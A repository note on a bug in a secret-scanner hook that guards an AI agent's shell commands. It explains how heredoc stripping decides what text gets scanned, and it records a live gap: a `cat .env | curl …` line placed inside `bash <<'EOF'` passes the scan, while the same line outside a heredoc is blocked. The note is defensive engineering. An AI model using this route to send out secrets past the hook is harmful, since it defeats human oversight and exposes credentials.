---
fit: works when you want a real instance of the scan boundary itself being the bug, not the pattern list — a reminder that "what text does the hook actually look at" is as load-bearing as "what does it look for"
last_seen: 2026-09-19
pairs_with: docs/agent-safety-hooks.md
---

# The scan boundary was the bug, not the pattern list

`secret-scanner.py`'s bash check deliberately excludes heredoc bodies from the dangerous-command
scan — its reasoning is that a heredoc's content is text being written, not a command being
executed, so scanning it for `curl .env` shaped patterns would just be scanning documentation.
That holds for `cat > file <<'EOF'`, not for a heredoc fed to an interpreter. The stripping is done by a
regex, [`_HEREDOC_RE`](../.agents/hooks/secret-scanner.py), matched against the command string
before the danger-pattern check runs.

That regex carries this comment, describing a bug in its own earlier version. The regex arrived
in this repo already fixed, so the earlier version is known only from the comment:

> The closing delimiter line ends the match at a `)` (subshell close), a following newline (more
> commands after the heredoc — the common case), or absolute end-of-string. Without the `\n`
> lookahead, a heredoc followed by anything but `)`/end-of-string failed to strip at all, leaving
> its full body exposed to `BASH_DANGER_PATTERNS`.

Concretely: a command shaped like `cmd <<'EOF' ... EOF\nsome_other_command`, where the heredoc is
followed by more commands on a later line rather than a subshell close, matched neither of the
closing alternatives the comment says the regex had before, `)` and end-of-string — the heredoc
body was left in the string handed to the danger-pattern scan, exposed to the same
false-positive risk the stripping step exists to avoid.
The fix, per the comment, added a following newline to the closing alternatives.

The lesson this example carries isn't about which patterns the scanner looks for — it's that a mechanical
tool-call-boundary hook has two places to get wrong, not one: what it looks for, and what part of
the input it looks at. A correct pattern list scanning the wrong slice of text is still a
correctness bug. This one erred toward over-blocking: harmless writes would be refused, which is
loud and gets noticed. The scanner also has the quiet failure today. A here-document's lines
"become the standard input" of the command
([Bash manual](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)), so a body
fed to `bash`, `sh`, `python3` or `ssh host` is executed, and the scanner strips it. Run on
2026-09-19: a `cat .env | curl …` line inside `bash <<'EOF'` exits 0; the same line outside a
heredoc exits 2. The literal-secret scan still reads the whole command.

See [`agent-safety-hooks.md`](../docs/agent-safety-hooks.md) for the practice this example
evidences.
